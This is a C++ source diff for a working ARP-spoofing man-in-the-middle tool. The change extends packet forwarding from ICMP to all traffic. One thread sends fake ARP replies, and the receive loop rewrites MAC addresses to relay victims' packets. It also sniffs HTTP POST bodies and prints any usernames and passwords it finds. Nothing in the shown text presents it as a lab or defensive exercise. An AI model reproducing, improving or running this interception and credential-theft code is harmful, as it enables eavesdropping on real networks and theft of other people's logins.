@@ -4,7 +4,7 @@
 // #define INFO 1
 
 // Function to handle receiving ARP responses
-void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, uint32_t gateway_ip, struct sockaddr_ll &device) {
+void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, uint32_t gateway_ip, sockaddr_in &my_ip, sockaddr_ll &device) {
     uint8_t buffer[IP_MAXPACKET];
     struct sockaddr saddr;
     int saddr_len = sizeof(saddr);
@@ -14,7 +14,6 @@ void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8
     printf("IP\t\t\tMAC\n");
     printf("-----------------------------------------\n");
 
-    uint32_t src_ip = 0;
     while (true) {
         // Receive packet
         int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
@@ -45,55 +44,50 @@ void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8
                 }
                 printf("%02x\n", arphdr->sender_mac[5]);
             }
+            continue;
         }
         // Check if packet is an ICMP packet
         if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
             continue;  // Not enough data for IP header
         }
         struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
-        if (iph->protocol == IPPROTO_ICMP) {
-            // Get the Ethernet header
-            struct ethhdr *eth = (struct ethhdr *)buffer;
-
-            // Save the source IP
-            if (src_ip == 0 && iph->saddr != gateway_ip) {
-                src_ip = iph->saddr;
-            }
-
-            // Change the source MAC to my MAC
-            memcpy(eth->h_source, my_mac.data(), ETH_ALEN);
-
-            // If the source IP is src_ip, change the destination MAC to the gateway's MAC
-            if (iph->saddr == src_ip) {
-                // Find the MAC address for the gateway IP
-                std::array<uint8_t, 4> gateway_ip_addr;
-                memcpy(gateway_ip_addr.data(), &gateway_ip, 4);
-                std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
-                memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
-
-                // Send the modified packet
-                if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
-                    perror("sendto() failed");
-                    exit(EXIT_FAILURE);
-                }
-            }
-            // If the destination IP is src_ip and destination MAC is not my_mac, change the destination MAC to src_ip's MAC
-            if (iph->daddr == src_ip && memcmp(eth->h_dest, my_mac.data(), ETH_ALEN) != 0) {
-                // Find the MAC address for the destination IP
-                std::array<uint8_t, 4> dest_ip_addr;
-                memcpy(dest_ip_addr.data(), &iph->daddr, 4);
-                std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
-                memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
-
-                // Send the modified packet
-                if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
-                    perror("sendto() failed");
-                    exit(EXIT_FAILURE);
-                }
-            }
+        // If the ip is loopback, continue
+        if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
+            continue;
         }
+        // Get the Ethernet header
+        struct ethhdr *eth = (struct ethhdr *)buffer;
+
+        bool modified = false;
+
+        // Change the source MAC to my MAC
+        memcpy(eth->h_source, my_mac.data(), ETH_ALEN);
+
+        // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
+        if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
+            // Find the MAC address for the gateway IP
+            std::array<uint8_t, 4> gateway_ip_addr;
+            memcpy(gateway_ip_addr.data(), &gateway_ip, 4);
+            std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
+            memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
+            modified = true;
+        }
+        // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
+        if (memcmp(eth->h_dest, my_mac.data(), ETH_ALEN) != 0 && iph->daddr != my_ip.sin_addr.s_addr && !modified) {
+            // Find the MAC address for the destination IP
+            std::array<uint8_t, 4> dest_ip_addr;
+            memcpy(dest_ip_addr.data(), &iph->daddr, 4);
+            std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
+            memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
+            modified = true;
+        }
+
         // Check if packet is a TCP packet
         if (bytes < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
+            if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
+                perror("sendto() failed");
+                exit(EXIT_FAILURE);
+            }
             continue;  // Not enough data for TCP header
         }
         // Get the payload
@@ -102,34 +96,73 @@ void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8
 
         // Check if the payload is an HTTP POST packet
         const char *http_post = "POST";
-        bool is_http_post = false;
 
-        if (payload_length >= strlen(http_post) && memcmp(payload, http_post, strlen(http_post)) == 0) {
-            is_http_post = true;
+        if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
+            int chunk_size = 1024;  // Size of each chunk
+            int total_sent = 0;     // Total amount of data sent
+            while (total_sent < bytes) {
+                int to_send = std::min(chunk_size, bytes - total_sent);
+                if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
+                    perror("sendto() failed");
+                    exit(EXIT_FAILURE);
+                }
+                total_sent += to_send;
+            }
+
+#ifdef DEBUG
+            // If the source IP or the destination IP is 192.168.146.1, continue
+            if (iph->saddr == htonl(0xc0a89201) || iph->daddr == htonl(0xc0a89201)) {
+                continue;
+            }
+            // Print the source IP address
+            printf("Source IP: %d.%d.%d.%d\t\t", iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
+            // Print the source MAC address
+            printf("Source MAC: ");
+            for (int i = 0; i < 5; i++) {
+                printf("%02x:", eth->h_source[i]);
+            }
+            printf("%02x\n", eth->h_source[5]);
+
+            // Print the destination IP address
+            printf("Destination IP: %d.%d.%d.%d\t\t", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
+            // Print the destination MAC address
+            printf("Destination MAC: ");
+            for (int i = 0; i < 5; i++) {
+                printf("%02x:", eth->h_dest[i]);
+            }
+            printf("%02x\n", eth->h_dest[5]);
+#endif
+            continue;
         }
 
-        if (is_http_post) {
-            // Find the username and password
-            char *username_start = strstr((char *)payload, "Username=");
-            char *password_start = strstr((char *)payload, "Password=");
-            if (username_start && password_start) {
-                char *username_end = strchr(username_start, '&');
-                char *password_end = (char *)payload + payload_length;
+        // Find the username and password
+        char *username_start = strstr((char *)payload, "Username=");
+        char *password_start = strstr((char *)payload, "Password=");
+        if (username_start && password_start) {
+            char *username_end = strchr(username_start, '&');
+            char *password_end = (char *)payload + payload_length;
 
-                if (!username_end) {
-                    username_end = password_start - 1;
-                }
+            if (!username_end) {
+                username_end = password_start - 1;
+            }
 
-                // Print the username and password
-                printf("Username: ");
-                for (char *p = username_start + strlen("Username="); p < username_end; p++) {
-                    printf("%c", *p);
-                }
-                printf("\nPassword: ");
-                for (char *p = password_start + strlen("Password="); p < password_end; p++) {
-                    printf("%c", *p);
-                }
-                printf("\n");
+            // Print the username and password
+            printf("Username: ");
+            for (char *p = username_start + strlen("Username="); p < username_end; p++) {
+                printf("%c", *p);
+            }
+            printf("\nPassword: ");
+            for (char *p = password_start + strlen("Password="); p < password_end; p++) {
+                printf("%c", *p);
+            }
+            printf("\n");
+        }
+
+        if (modified) {
+            // Send the modified packet
+            if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
+                perror("sendto() failed");
+                exit(EXIT_FAILURE);
             }
         }
         memset(buffer, 0, IP_MAXPACKET);
@@ -175,12 +208,12 @@ void send_fake_arp_replies(int sd, std::map<std::array<uint8_t, 4>, std::array<u
 
 #ifdef DEBUG
                 // Print fake ARP reply
-                printf("Fake ARP reply sent\n");
-                printf("Source IP: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
-                printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
-                printf("Target IP: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);
-                printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.target_mac[0], arphdr.target_mac[1], arphdr.target_mac[2], arphdr.target_mac[3], arphdr.target_mac[4], arphdr.target_mac[5]);
-                printf("-----------------------------------------\n");
+                // printf("Fake ARP reply sent\n");
+                // printf("Source IP: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
+                // printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
+                // printf("Target IP: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);
+                // printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.target_mac[0], arphdr.target_mac[1], arphdr.target_mac[2], arphdr.target_mac[3], arphdr.target_mac[4], arphdr.target_mac[5]);
+                // printf("-----------------------------------------\n");
 #endif
             }
         }
@@ -294,7 +327,7 @@ int main(int argc, char **argv) {
     std::thread send_thread(send_fake_arp_replies, sd, std::ref(ip_mac_pairs), src_mac, std::ref(device));
 
     // Receive responses
-    receive_responses(sd, ip_mac_pairs, src_mac, gateway_ip, device);
+    receive_responses(sd, ip_mac_pairs, src_mac, gateway_ip, src_ip, device);
 
     // Wait for the thread to finish
     send_thread.join();
